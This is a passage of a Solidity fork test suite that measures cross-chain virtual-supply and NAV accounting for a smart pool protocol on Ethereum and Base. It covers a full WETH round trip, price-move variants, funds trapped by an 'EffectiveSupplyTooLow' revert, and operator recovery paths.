        assertEq(_readVS(ethereum.pool), 0, "emptied Eth: VS == 0");
        assertEq(_u(ethereum.pool), 1e6, "emptied Eth: u == par (empty-pool sentinel)");
    }

    /// @notice Outbound leg + geometry assertions. Must be called with any price mocks already
    ///         installed on both forks (they govern the outbound valuation). Ends on the mainnet fork.
    function _singleSupplyOutbound(uint256 wethAmount) internal returns (uint256 burnt1, uint256 minted1) {
        vm.selectFork(baseForkId);
        uint256 wethValue0 = uint256(
            IEOracle(base.pool).convertTokenAmount(Constants.BASE_WETH, int256(wethAmount), Constants.BASE_USDC)
        );
        assertApproxEqAbs(_u(base.pool), 1e6, 200, "outbound: Base u pinned at par");
        _depositV3(base.pool, Constants.BASE_WETH, Constants.ETH_WETH, wethAmount, Constants.ETHEREUM_CHAIN_ID);
        burnt1 = uint256(-_readVS(base.pool));
        assertApproxEqRel(burnt1, wethValue0, 0.0002e18, "outbound: Base VS == -(WETH value)/u0");
        assertApproxEqRel(burnt1, WETH_BOOK_TARGET, 0.001e18, "outbound: |VS| ~= the WETH half of the book");
        assertEq(IERC20(Constants.BASE_WETH).balanceOf(base.pool), 0, "outbound: Base holds only USDC now");
        assertApproxEqAbs(_u(base.pool), 1e6, 200, "outbound: Base u still par (V and ES dropped together)");
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_WETH, wethAmount);
        minted1 = uint256(_readVS(ethereum.pool));
        assertGt(minted1, 0, "arrival: Eth VS positive");
        assertEq(ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply, 0, "arrival: Eth TS still 0");
        assertEq(_u(ethereum.pool), 1e6, "arrival: Eth u at the empty-pool sentinel (par)");
        assertApproxEqRel(minted1, burnt1, 0.02e18, "arrival: Eth VS ~= Base |VS| (cross-chain feed basis only)");
    }

    /// @notice One moved variant from the post-outbound snapshot: install +/-10% mocks on both
    ///         oracles, optionally run the exact equalizing Sync, then attempt the full-WETH return
    ///         leg and measure everything. Assumes the caller positioned the state at the snapshot
    ///         (vm.revertTo). Ends on the mainnet fork.
    function _runSingleSupplyVariant(
        int24 ticks,
        bool withSync,
        uint256 wethAmount
    ) internal returns (SingleSupplyVariant memory v) {
        v.ticks = ticks;
        v.withSync = withSync;
        vm.clearMockedCalls(); // mockCall state survives revertTo - install from the REAL ticks
        vm.selectFork(mainnetForkId);
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, ticks);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, ticks);

        // -- step 4: the exact equalizing Sync, computed from measured on-chain state --
        if (withSync) {
            ChainState memory csB = _readChainState(base.pool); // Base FIRST: identical pool addresses
            vm.selectFork(mainnetForkId);
            ChainState memory csE = _readChainState(ethereum.pool);
            int256 esB = int256(csB.ts) + csB.vs;
            int256 esE = int256(csE.ts) + csE.vs;
            // parity: (V_B - d)/ES_B == (V_E + d)/ES_E -> d = (V_B*ES_E - V_E*ES_B)/(ES_B + ES_E)
            int256 delta = (int256(csB.v) * esE - int256(csE.v) * esB) / (esB + esE);
            v.syncEthToBase = delta < 0; // gain: Eth NAV above Base -> Eth ships value (its only asset: WETH)
            v.syncAmount = uint256(delta < 0 ? -delta : delta);
            assertGt(v.syncAmount, 0, "sync: the move created a divergence to equalize");
            uint256 uBaseSynced;
            if (delta < 0) {
                uint256 wethOut = uint256(
                    IEOracle(ethereum.pool).convertTokenAmount(Constants.ETH_USDC, -delta, Constants.ETH_WETH)
                );
                assertLt(wethOut, IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool), "sync: Eth WETH covers d");
                int256 vsE = _readVS(ethereum.pool);
                _depositV3(
                    ethereum.pool,
                    Constants.ETH_WETH,
                    Constants.BASE_WETH,
                    wethOut,
                    Constants.BASE_CHAIN_ID,
                    OpType.Sync
                );
                assertEq(_readVS(ethereum.pool), vsE, "sync: NO VS write on Eth");
                vm.selectFork(baseForkId);
                _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, wethOut, OpType.Sync);
                assertEq(_readVS(base.pool), csB.vs, "sync: NO VS write on Base");
                uBaseSynced = _u(base.pool);
            } else {
                vm.selectFork(baseForkId);
                assertLt(v.syncAmount, IERC20(Constants.BASE_USDC).balanceOf(base.pool), "sync: Base USDC covers d");
                int256 vsB = _readVS(base.pool);
                _depositV3(
                    base.pool,
                    Constants.BASE_USDC,
                    Constants.ETH_USDC,
                    v.syncAmount,
                    Constants.ETHEREUM_CHAIN_ID,
                    OpType.Sync
                );
                assertEq(_readVS(base.pool), vsB, "sync: NO VS write on Base");
                uBaseSynced = _u(base.pool);
                vm.selectFork(mainnetForkId);
                _simulateFill(
                    ethereum.pool,
                    Constants.ETH_MULTICALL_HANDLER,
                    Constants.ETH_USDC,
                    v.syncAmount,
                    OpType.Sync
                );
                assertEq(_readVS(ethereum.pool), csE.vs, "sync: NO VS write on Eth");
            }
            vm.selectFork(mainnetForkId);
            v.parityGapBps = _bpsGap(uBaseSynced, _u(ethereum.pool));
            assertApproxEqRel(uBaseSynced, _u(ethereum.pool), 0.002e18, "sync: equalizing Sync restored NAV parity");
        }

        // -- step 5: the full-WETH return leg from the emptied Eth pool --
        vm.selectFork(mainnetForkId);
        v.ethVSPreReturn = _readVS(ethereum.pool);
        v.ethWethPreReturn = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        try this.trySingleReturnLeg(wethAmount) {
            v.returnSucceeded = true;
            vm.selectFork(baseForkId);
            _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, wethAmount);
        } catch (bytes memory err) {
            v.returnError = err;
        }

        // -- measure finals (Base first: identical pool addresses on both forks) --
        vm.selectFork(baseForkId);
        v.baseVSFinal = _readVS(base.pool);
        v.baseUFinal = _u(base.pool);
        v.baseNavFinal = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        (v.baseClosureGap, ) = _assertNavClosure(base.pool, "variant Base");
        vm.selectFork(mainnetForkId);
        v.ethVSFinal = _readVS(ethereum.pool);
        v.ethUFinal = _u(ethereum.pool);
        v.ethWethFinal = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        (v.ethClosureGap, ) = _assertNavClosure(ethereum.pool, "variant Eth");
    }

    function _logVariant(string memory name, SingleSupplyVariant memory v) internal pure {
        console2.log("==== VARIANT", name);
        console2.log("  sync amount (0 = none):", v.syncAmount);
        console2.log("  sync direction Eth->Base:", v.syncEthToBase);
        console2.log("  parity gap after sync (bps):", v.parityGapBps);
        console2.log("  return succeeded:", v.returnSucceeded);
        console2.log("  Eth VS pre-return:", v.ethVSPreReturn);
        console2.log("  Eth VS post-return:", v.ethVSFinal);
        console2.log("  Eth WETH pre/post return:", v.ethWethPreReturn, v.ethWethFinal);
        console2.log("  Base VS final:", v.baseVSFinal);
        console2.log("  Base NAV / u final:", v.baseNavFinal, v.baseUFinal);
        console2.log("  Eth u final:", v.ethUFinal);
        console2.log("  closure gaps Base / Eth (raw):", v.baseClosureGap, v.ethClosureGap);
    }

    /// @notice Operator burns Eth shares after the bootstrap: USDC payouts first, then WETH via
    ///         burnForToken, stopping when both wallets are dust-dry (the insolvency floor).
    /// @return sharesLeft unburnable shares (the claimless husk)
    function _operatorBurnEthDry() internal returns (uint256 sharesLeft) {
        sharesLeft = ISmartPoolState(ethereum.pool).balanceOf(poolOwner);
        uint256 guard;
        while (sharesLeft > 0) {
            require(++guard < 100, "operator burn did not converge");
            uint256 u = ISmartPoolActions(ethereum.pool).updateUnitaryValue().unitaryValue;
            uint256 maxByUsdc = (IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool) * 1e6) / u;
            if (maxByUsdc >= sharesLeft) {
                try this.tryOperatorBurnEth(sharesLeft) {
                    return 0;
                } catch {}
            }
            if (maxByUsdc > 1e6) {
                try this.tryOperatorBurnEth(maxByUsdc) {
                    sharesLeft -= maxByUsdc;
                    continue;
                } catch {}
            }
            uint256 wethBal = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
            uint256 wethValue = uint256(
                IEOracle(ethereum.pool).convertTokenAmount(Constants.ETH_WETH, int256(wethBal), Constants.ETH_USDC)
            );
            if (wethValue > 1e6) {
                uint256 chunk = sharesLeft < wethValue ? sharesLeft : wethValue;
                try this.tryOperatorBurnForTokenEth(chunk) {
                    sharesLeft -= chunk;
                    continue;
                } catch {}
            }
            return sharesLeft; // both wallets dust-dry: the remainder is unpayable
        }
    }

    /// @notice THE SINGLE-SUPPLY GEOMETRY. Base (the originator) holds the ENTIRE supply of a ~50/50
    ///         WETH book at par (NAV ~$1.5M); Eth (the destination) was burned to TS = 0, assets = 0
    ///         (u = the empty-pool sentinel = par). The WHOLE WETH half crosses to Eth.
    ///
    ///         PINNED-PAR CONTROL: with the price pinned identically for both legs, the return leg
    ///         unwinds Eth to EXACTLY VS = 0 and Base to EXACTLY VS = 0 - the geometry is exact.
    ///
    ///         MOVED VARIANTS: the full return leg reverts EffectiveSupplyTooLow at initiation
    ///         UNLESS Eth's fresh u = floor(V*1e6/ES) exceeds the WETH-value-per-virtual-share ratio
    ///         v*1e6/m (m = the arrival VS). Flooring makes burnt2 = floor(v*1e6/u) >= m whenever
    ///         u <= v*1e6/m, so Eth's VS lands at m - burnt2 <= 0 and with TS = 0 the 19/20 supply
    ///         rule (20|VS| <= 19*TS, NavImpactLib.validateSupply) can never hold. GAIN, GAIN+SYNC
    ///         and LOSS all sit on the wrong side (the gain-direction sync REMOVES value from Eth,
    ///         lowering u further) and revert: the funds are trapped, partial returns still work.
    ///         LOSS+SYNC is the exception (documented, measured): the loss-direction equalizing
    ///         Sync ships USDC to Eth - value IN with no VS write - which raises u above the ratio,
    ///         so the full return SUCCEEDS, most of the position returns, and Eth is left with a
    ///         small POSITIVE residual VS backed by the sync USDC (NOT zero; Base's pin shrinks
    ///         but survives). Deviation from the prescribed step-5a "unwinds to exactly zero in
    ///         ALL variants": measured reality reverts in 3 of 4 moved variants and never unwinds
    ///         to exactly zero except in the pinned-par control.
    ///
    ///         The equalizing Sync (gain: Eth->Base in WETH; loss: Base->Eth in USDC - the sign is
    ///         verified from on-chain state) restores NAV parity but writes NO VS; its only
    ///         trap-relieving power is the value-in side-effect measured in the LOSS+SYNC variant.
    ///
    ///         UNSTUCK (loss variant): a USDC remedy from the emptied Eth FAILS at initiation
    ///         ("ERC20: transfer amount exceeds balance" - the pool wallet holds no USDC). Two
    ///         escape hatches measured: (a) a vm.store VS-slot reset (upgrade emulation) makes Base
    ///         fully burnable at V/TS (~$0.50/share) while the WETH strand (~$692k) stays on Eth
    ///         with TS = 0 - unclaimable, and even resetting Eth's VS leaves it as NAV for the NEXT
    ///         minter (fresh-minter sweep surface); (b) an external-money bootstrap - the operator
    ///         mints ~$751.5k USDC into the empty Eth pool (0.2% above the 10bps mint spread), one
    ///         exactly-sized relief Transfer v = ceil(|VS_B|*u_B/1e6) lands Base VS at EXACTLY 0,
    ///         Base becomes fully burnable at par (users made whole minus the 0.1% spread), and the
    ///         operator burns down to the insolvency floor TS ~= |VS_E|, net cost ~= the WETH hole.
    function test_SingleSupplyChainGeometry_WethRoundTrip() public {
        // ===== substrate shared by control + matrix: fixture, mints, warp (no book yet) =====
        _deployPureUsdcScenario(WETH_LOSS_EXTRA_MINT);
        ForkSnapshot memory snapshot0 = _snapshotBoth();

        // ===== PINNED-PAR CONTROL: both legs valued at the identical pinned price =====
        {
            vm.selectFork(mainnetForkId);
            _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, 0);
            vm.selectFork(baseForkId);
            _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, 0);
            (uint256 wethPar, ) = _buildWethLossBook();
            _emptyEthPool();
            vm.selectFork(baseForkId);
            uint256 navBase0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
            (uint256 burnt1Par, uint256 minted1Par) = _singleSupplyOutbound(wethPar);
            console2.log("==== PAR CONTROL (price pinned for both legs)");
            console2.log("  burnt1 (Base):", burnt1Par);
            console2.log("  minted1 (Eth):", minted1Par);
            vm.selectFork(mainnetForkId);
            try this.trySingleReturnLeg(wethPar) {
                vm.selectFork(baseForkId);
                _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, wethPar);
                assertEq(_readVS(base.pool), 0, "par control: Base VS unwinds to EXACTLY 0");
                assertApproxEqRel(
                    ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue,
                    navBase0,
                    0.0005e18,
                    "par control: Base NAV restored"
                );
                vm.selectFork(mainnetForkId);
                assertEq(_readVS(ethereum.pool), 0, "par control: Eth VS unwinds to EXACTLY 0");
                assertEq(IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool), 0, "par control: Eth WETH wallet empty");
                (uint256 gapPar, ) = _assertNavClosure(ethereum.pool, "par control Eth");
                console2.log("  Eth closure gap (raw):", gapPar);
            } catch {
                revert("par control: pinned-price return must succeed");
            }
        }
        _revertBoth(snapshot0); // consume; the matrix below rebuilds the book deterministically
        vm.clearMockedCalls(); // mockCall state survives revertTo - the matrix runs on the real feed basis

        // ===== MAIN MATRIX: book + emptied Eth + outbound (unpinned, real feed basis) =====
        (uint256 wethAmount, ) = _buildWethLossBook();
        _emptyEthPool();
        (uint256 burnt1, uint256 minted1) = _singleSupplyOutbound(wethAmount);
        console2.log("==== POST-OUTBOUND GEOMETRY");
        console2.log("  Base VS (=-value/u0):", burnt1);
        console2.log("  Eth VS (=arrival value at sentinel):", minted1);
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), -int256(burnt1), "geometry: Base VS == -burnt1");
        assertEq(ISmartPoolState(base.pool).getPoolTokens().totalSupply, 1_498_500e6, "geometry: Base TS unchanged");
        assertApproxEqAbs(_u(base.pool), 1e6, 200, "geometry: Base u pinned at par (ES halved with V)");
        vm.selectFork(mainnetForkId);
        assertEq(ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply, 0, "geometry: Eth TS == 0");
        assertEq(int256(minted1), _readVS(ethereum.pool), "geometry: Eth effective supply is VS ONLY");
        (uint256 gapEth0, uint256 esEth0) = _assertNavClosure(ethereum.pool, "geometry Eth");
        console2.log("  Eth closure gap (raw):", gapEth0, "ES bound:", esEth0 / 1e6);
        ForkSnapshot memory snapshot1 = _snapshotBoth();

        // ===== steps 3-5: +/-10% on BOTH oracles, +/- equalizing Sync, return leg =====
        int24[4] memory ticksMatrix = [TICKS_10PCT, TICKS_10PCT, -TICKS_10PCT, -TICKS_10PCT];
        bool[4] memory syncMatrix = [true, false, true, false];
        string[4] memory names = ["GAIN+SYNC", "GAIN", "LOSS+SYNC", "LOSS"];
        SingleSupplyVariant[] memory variants = new SingleSupplyVariant[](4);
        for (uint256 i = 0; i < 4; i++) {
            _revertBoth(snapshot1); // consume (snapshots are one-shot)...
            snapshot1 = _snapshotBoth(); // ...and immediately re-capture the CLEAN state
            variants[i] = _runSingleSupplyVariant(ticksMatrix[i], syncMatrix[i], wethAmount);
            _logVariant(names[i], variants[i]);
        }

        // ===== the law across all moved variants =====
        for (uint256 i = 0; i < 4; i++) {
            SingleSupplyVariant memory v = variants[i];
            if (i == 2) {
                // LOSS+SYNC (documented, measured): the loss-direction Sync ships USDC to Eth, which
                // RAISES Eth's u = V/ES above the WETH-value-per-virtual-share ratio v*1e6/m. The
                // full-WETH unwind then burns strictly less than m, VS stays positive, and the
                // return SUCCEEDS - most of the position comes home, Eth keeps a small POSITIVE
                // residual VS backed by the sync USDC, and Base's pin shrinks but survives.
                assertTrue(v.returnSucceeded, "LOSS+SYNC: the loss-direction sync enables the return");
                assertEq(v.ethWethFinal, 0, "LOSS+SYNC: the WETH returned to Base");
                assertGt(v.ethVSFinal, 0, "LOSS+SYNC: Eth left with a small POSITIVE residual VS (NOT zero)");
                assertLt(v.ethVSFinal, v.ethVSPreReturn, "LOSS+SYNC: most of the VS unwound");
                assertLt(v.baseVSFinal, 0, "LOSS+SYNC: Base still pinned (the loss stays claim-imbalanced)");
                assertGt(v.baseVSFinal, -int256(burnt1), "LOSS+SYNC: the return relieved part of Base's pin");
            } else {
                assertTrue(!v.returnSucceeded, "moved variant: the full return leg REVERTS");
                assertEq(v.returnError.length, 4, "moved variant: custom error payload");
                bytes memory err = v.returnError;
                bytes4 sel;
                assembly {
                    sel := mload(add(err, 32))
                }
                assertEq(sel, NavImpactLib.EffectiveSupplyTooLow.selector, "moved variant: EffectiveSupplyTooLow");
                assertEq(v.ethVSFinal, v.ethVSPreReturn, "moved variant: the reverted initiation wrote nothing");
                assertEq(v.ethWethFinal, v.ethWethPreReturn, "moved variant: the WETH never left Eth");
                assertEq(v.ethVSFinal, int256(minted1), "moved variant: Eth VS still the full arrival");
                assertEq(v.baseVSFinal, -int256(burnt1), "moved variant: Base VS still -burnt1 (sync is VS-neutral)");
            }
            if (v.withSync) {
                if (v.ticks > 0) {
                    assertTrue(v.syncEthToBase, "gain: the equalizing Sync flows Eth->Base");
                } else {
                    assertTrue(!v.syncEthToBase, "loss: the equalizing Sync flows Base->Eth");
                }
                assertLt(v.parityGapBps, 50, "sync: NAV parity restored within 0.5%");
            }
        }
        console2.log("==== LAW: GAIN / GAIN+SYNC / LOSS revert the FULL unwind (EffectiveSupplyTooLow): the");
        console2.log("           trap opens unless u_E > v*1e6/m, i.e. VALUE IN without VS. Only the LOSS+SYNC");
        console2.log("           delivers that (its equalizing Sync is exactly value-in), so it alone unblocks");
        console2.log("           the return - and even then Eth ends at a small POSITIVE VS, not zero.");

        // ===== step 6: unstuck, continuing from the live LOSS (no-sync) variant =====
        // -- 6.0 inbound USDC remedy from the emptied Eth must FAIL --
        vm.selectFork(mainnetForkId);
        try this.trySingleUsdcTransfer(1000e6) {
            revert("remedy from the emptied Eth must fail");
        } catch (bytes memory err) {
            bytes4 sel;
            assembly {
                sel := mload(add(err, 32))
            }
            assertEq(bytes4(0x08c379a0), sel, "remedy fails inside the USDC transfer");
            console2.log(
                "6.0 remedy from empty Eth reverted: ERC20 transfer amount exceeds balance (132-byte Error(string))"
            );
        }

        // -- 6a/6b: measured in dedicated helpers (keeps this function inside the stack limit) --
        _singleSupplyResetPath(burnt1);
        _singleSupplyBootstrap(snapshot1, wethAmount, burnt1, minted1);
    }

    /// @notice 6a: a vm.store VS-slot reset (upgrade emulation) makes Base fully burnable at V/TS,
    ///         while the WETH strand on Eth (TS = 0) becomes permanently unclaimable - and, once
    ///         Eth's own VS is reset too, NAV for the NEXT minter (fresh-minter sweep surface).
    function _singleSupplyResetPath(uint256 burnt1) internal {
        console2.log("==== 6a RESET PATH (vm.store VS slot, upgrade emulation)");
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), -int256(burnt1), "6a: starts from the pinned Base state");
        uint256 baseUsdcPre = IERC20(Constants.BASE_USDC).balanceOf(base.pool);
        vm.store(base.pool, VS_SLOT, bytes32(uint256(0)));
        assertEq(_readVS(base.pool), 0, "6a: Base VS slot reset");
        assertApproxEqRel(_u(base.pool), 499_500, 0.01e18, "6a: u recomputes to V/TS (~half par) once ES == TS");
        uint256 userUsdc0 = IERC20(Constants.BASE_USDC).balanceOf(user);
        _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, 0);
        uint256 userReceived = IERC20(Constants.BASE_USDC).balanceOf(user) - userUsdc0;
        assertApproxEqRel(
            userReceived,
            (baseUsdcPre * 999) / 1000,
            0.002e18,
            "6a: users recover ~99.9% (0.1% burn spread)"
        );
        assertLt(IERC20(Constants.BASE_USDC).balanceOf(base.pool), 1e6, "6a: Base strand < 1 USDC");
        console2.log("6a: users received (raw):", userReceived);
        vm.selectFork(mainnetForkId);
        uint256 strandedWeth = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        assertGt(strandedWeth, 0, "6a: the WETH is stranded on Eth");
        console2.log("6a: WETH stranded on Eth (TS=0, no claims can reach it):", strandedWeth);
        console2.log("6a: Eth VS stranded too:", _readVS(ethereum.pool));
        vm.store(ethereum.pool, VS_SLOT, bytes32(uint256(0)));
        uint256 sweepSurface = ISmartPoolActions(ethereum.pool).updateUnitaryValue().netTotalValue;
        assertGt(sweepSurface, 0, "6a: after resetting Eth VS the stranded WETH is NAV for the NEXT minter");
        console2.log("6a: Eth NAV after VS reset (fresh-minter sweep surface):", sweepSurface);
    }

    /// @notice 6b: external-money bootstrap. The operator mints ~0.2% above the relief value into the
    ///         empty Eth pool (the 10bps mint spread credits less), one exactly-sized relief Transfer
    ///         v = ceil(|VS_B|*u_B/1e6) lands Base VS at EXACTLY 0, Base becomes fully burnable at par
    ///         (users made whole minus the 0.1% spread), and the operator burns down to the insolvency
    ///         floor TS ~= |VS_E|, net cost ~= the WETH hole. Positions the state at `snapshot`
    ///         (post-outbound) with the -10% mocks installed first.
    function _singleSupplyBootstrap(
        ForkSnapshot memory snapshot,
        uint256 wethAmount,
        uint256 burnt1,
        uint256 minted1
    ) internal {
        console2.log("==== 6b EXTERNAL-MONEY BOOTSTRAP");
        _revertBoth(snapshot); // fresh post-outbound state on BOTH forks
        vm.clearMockedCalls(); // mockCall state survives revertTo
        vm.selectFork(mainnetForkId);
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, -TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, -TICKS_10PCT);
        vm.selectFork(mainnetForkId);
        try this.trySingleReturnLeg(wethAmount) {
            revert("bootstrap preface: return must revert");
        } catch {}
        assertEq(_readVS(ethereum.pool), int256(minted1), "6b: Eth VS unchanged after the failed return");
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), -int256(burnt1), "6b: Base VS pinned before the bootstrap");
        uint256 baseUsdcPre = IERC20(Constants.BASE_USDC).balanceOf(base.pool);

        // operator mints ~0.2% above the relief value (the pool's 10bps mint spread credits less)
        uint256 mintAmount = (burnt1 * 1002) / 1000;
        {
            vm.selectFork(mainnetForkId); // ETH_USDC lives on the mainnet fork
            deal(Constants.ETH_USDC, poolOwner, mintAmount);
            vm.startPrank(poolOwner);
            IERC20(Constants.ETH_USDC).approve(ethereum.pool, mintAmount);
            ISmartPool(payable(ethereum.pool)).mint(poolOwner, mintAmount, 0);
            vm.stopPrank();
            _warpPastLockup(ethereum.pool);
            assertEq(
                ISmartPoolState(ethereum.pool).balanceOf(poolOwner),
                ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply,
                "6b: the operator alone holds the new Eth supply"
            );

            // one exactly-sized relief Transfer v = ceil(|VS_B| * u_B / 1e6) relieves Base fully
            vm.selectFork(baseForkId);
            uint256 uBase = _u(base.pool);
            uint256 relief = (burnt1 * uBase + 1e6 - 1) / 1e6;
            vm.selectFork(mainnetForkId);
            assertLe(relief, IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool), "6b: the mint covers the relief");
            uint256 poolUsdcPre = IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool);
            try this.trySingleUsdcTransfer(relief) {} catch {
                revert("6b: relief initiation failed");
            }
            assertEq(
                poolUsdcPre - IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool),
                relief,
                "6b: relief paid from the pool wallet"
            );
            vm.selectFork(baseForkId);
            _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, relief);
            assertEq(_readVS(base.pool), 0, "6b: Base VS relieved to EXACTLY 0 - one iteration, no refinement");
            assertApproxEqAbs(_u(base.pool), 1e6, 200, "6b: Base back at par");
            (uint256 gapBaseB, ) = _assertNavClosure(base.pool, "6b Base");

            // Base is fully burnable: the user recovers the book minus the 0.1% burn spread
            uint256 userUsdcB0 = IERC20(Constants.BASE_USDC).balanceOf(user);
            _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, 0);
            assertEq(ISmartPoolState(base.pool).getPoolTokens().totalSupply, 0, "6b: 100% of Base burned");
            uint256 userReceivedB = IERC20(Constants.BASE_USDC).balanceOf(user) - userUsdcB0;
            assertApproxEqRel(
                userReceivedB,
                ((baseUsdcPre + relief) * 999) / 1000,
                0.002e18,
                "6b: users made whole (minus spread)"
            );
            assertLt(IERC20(Constants.BASE_USDC).balanceOf(base.pool), 1e6, "6b: Base strand < 1 USDC");
            console2.log("6b: users received (raw):", userReceivedB, "closure gap:", gapBaseB);
        }

        // the operator burns Eth down to the insolvency floor (~|VS|: the WETH hole)
        vm.selectFork(mainnetForkId);
        int256 vsE = _readVS(ethereum.pool);
        uint256 ownerUsdc0 = IERC20(Constants.ETH_USDC).balanceOf(poolOwner);
        uint256 ownerWeth0 = IERC20(Constants.ETH_WETH).balanceOf(poolOwner);
        uint256 sharesLeft = _operatorBurnEthDry();
        uint256 operatorCost;
        {
            uint256 ownerUsdcOut = IERC20(Constants.ETH_USDC).balanceOf(poolOwner) - ownerUsdc0;
            uint256 ownerWethOut = IERC20(Constants.ETH_WETH).balanceOf(poolOwner) - ownerWeth0;
            uint256 wethValueOut = uint256(
                IEOracle(ethereum.pool).convertTokenAmount(Constants.ETH_WETH, int256(ownerWethOut), Constants.ETH_USDC)
            );
            operatorCost = mintAmount - ownerUsdcOut - wethValueOut;
            console2.log("6b: operator received USDC / WETH-worth:", ownerUsdcOut, wethValueOut);
        }
        console2.log("6b: operator shares left unburnable (claimless husk):", sharesLeft);
        console2.log("6b: operator net cost (raw 6-dec):", operatorCost);
        assertApproxEqRel(
            sharesLeft,
            uint256(-vsE),
            0.2e18,
            "6b: the operator burns down to ~|VS| (the insolvency floor)"
        );
        {
            uint256 strandedValue = uint256(
                IEOracle(ethereum.pool).convertTokenAmount(
                    Constants.ETH_WETH,
                    int256(IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool)),
                    Constants.ETH_USDC
                )
            ) + IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool);
            // the strand is the failed burnForToken chunk's WETH (~2.6 WETH), still claimed by the husk
            assertLt(strandedValue, 10e9, "6b: Eth strands < $10k of WETH behind the husk (the failed chunk)");
            // the hole the operator underwrote: Eth VS at arrival minus the WETH it is actually worth
            uint256 hole = uint256(minted1) -
                uint256(
                    IEOracle(ethereum.pool).convertTokenAmount(
                        Constants.ETH_WETH,
                        int256(wethAmount),
                        Constants.ETH_USDC
                    )
                );
            assertApproxEqRel(operatorCost, hole, 0.25e18, "6b: the operator's net cost ~= the WETH hole");
        }
        (uint256 gapEthB, ) = _assertNavClosure(ethereum.pool, "6b Eth");
        console2.log("6b: Eth closure gap (raw):", gapEthB);
    }

    /*//////////////////////////////////////////////////////////////////////////
        TS=0 RETURN TRAP: operator workaround - partial return sized to the VS
        //////////////////////////////////////////////////////////////////////////*/

    struct PartialReturnState {
        int24 ticks; // signed oracle move (+gain / -loss)
        uint256 m; // Eth VS to unwind (== minted1, raw)
        // sizing
        uint256 wSized; // candidate WETH amount whose source-leg burn stays <= m (wei)
        uint256 burntModeled; // modeled source-leg burn at wSized (raw shares)
        uint256 windowWei; // exact-equality window width in wei (0 = m skipped)
        bool exactZero; // true if burnt(wSized) == m exactly
        // Eth finals
        uint256 wUsed; // actually initiated amount (wei)
        uint256 burntActual; // actual source-leg burn (raw)
        int256 ethVSFinal; // expected: 0 (gain) or the minimal positive remainder (loss)
        uint256 ethWethDust; // wei left on Eth
        uint256 ethDustValue; // dust value in raw base units
        bool dustSyncReverted; // the dust Sync-out reverted (validateNavImpact)
        // Base finals
        int256 baseVSFinal;
        uint256 minted2; // arrival VS write on Base (raw)
        uint256 coverageBps; // claims/assets
        uint256 closureGap;
        // burn outcome on Base
        bool fullBurn; // gain: 100% of TS burned with zero reverts
        uint256 maxBurnable; // loss: measured max burnable (raw shares)
        uint256 lockedTail; // loss: TS wall (raw shares)
        uint256 userReceived; // value paid out to the user while burning (raw base units)
    }

    /// @notice Model the Eth source-leg VS write for a candidate WETH amount, using the pool's own
    ///         oracle and unitaryValue (the identical math AIntents._handleSourceTransfer runs):
    ///         burnt = convert(WETH -> USDC) * 1e6 / unitaryValue. Mainnet fork must be selected
    ///         and the move mock installed.
    function _modelledBurnt(uint256 wethAmount) internal returns (uint256) {
        uint256 u = ISmartPoolActions(ethereum.pool).updateUnitaryValue().unitaryValue;
        uint256 v = uint256(
            IEOracle(ethereum.pool).convertTokenAmount(Constants.ETH_WETH, int256(wethAmount), Constants.ETH_USDC)
        );
        return (v * 1e6) / u;
    }

    /// @notice Binary-search (monotone) the exact-equality window: the candidate WETH amounts whose
    ///         modeled burn lands Eth VS at exactly 0, i.e. burnt(w) == m. If the window is empty
    ///         (possible only when u_E < 1e6: its width u_E/1e6 < 1 raw unit can skip m), fall back
    ///         to the largest w with burnt(w) <= m - the initiation then leaves the minimal
    ///         positive remainder m - burnt(w).
    function _sizePartialReturn(
        uint256 wethBal,
        uint256 m
    ) internal returns (uint256 wSized, uint256 burnt, uint256 windowWei, bool exact) {
        // first w with burnt(w) >= m (exists: the anchored full return reverts, so burnt(wethBal) > m)
        uint256 lo = 0;
        uint256 hi = wethBal;
        while (lo < hi) {
            uint256 mid = (lo + hi) >> 1;
            if (_modelledBurnt(mid) >= m) hi = mid;
            else lo = mid + 1;
        }
        burnt = _modelledBurnt(lo);
        if (burnt == m) {
            // exact-zero window: find its top (first w with burnt(w) >= m + 1) for the width
            wSized = lo;
            exact = true;
            uint256 lo2 = lo;
            uint256 hi2 = wethBal;
            while (lo2 < hi2) {
                uint256 mid = (lo2 + hi2) >> 1;
                if (_modelledBurnt(mid) >= m + 1) hi2 = mid;
                else lo2 = mid + 1;
            }
            windowWei = lo2 - lo;
        } else {
            // m skipped: the largest w below the failing threshold burns strictly less than m
            wSized = lo - 1;
